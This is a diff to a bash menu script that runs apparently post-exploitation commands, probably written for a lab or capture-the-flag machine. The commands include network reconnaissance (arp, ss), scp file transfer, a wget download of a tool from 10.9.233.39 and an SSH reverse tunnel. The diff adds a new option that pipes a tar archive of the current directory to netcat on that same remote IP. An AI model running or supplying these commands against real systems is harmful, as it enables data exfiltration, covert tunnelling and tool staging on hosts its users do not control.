@@ -5,7 +5,8 @@ COMMAND_2='arp -a'
 COMMAND_3='ss -tulpn'
 COMMAND_4='scp FILE_TO_SEND L_H_O_S_T'
 COMMAND_5='wget -O /tmp/ http://10.9.233.39:8000/[TOOL]'
-COMMAND_6='ssh -R 8000:172.16.0.1:80 frog@172.16.0.2' -i id_rsa -fN'
+COMMAND_6='ssh -R 8000:172.16.0.1:80 frog@172.16.0.2 -i id_rsa -fN'
+COMMAND_7='tar cf - . | nc 10.9.233.39 5555'
 
 show_menus() {
   clear
@@ -17,6 +18,8 @@ show_menus() {
   echo "  3) $COMMAND_3"
   echo "  4) $COMMAND_4"
   echo "  5) $COMMAND_5"
+  echo "  6) $COMMAND_6"
+  echo "  7) $COMMAND_7"
   echo ""
   echo "  x. Exit"
   echo ""
@@ -36,6 +39,8 @@ read_options() {
     3) run $COMMAND_3;;
     4) run $COMMAND_4;;
     5) run $COMMAND_5;;
+    6) run $COMMAND_6;;
+    7) run $COMMAND_7;;
 
     x) exit 0;;
     exit) exit 0;;
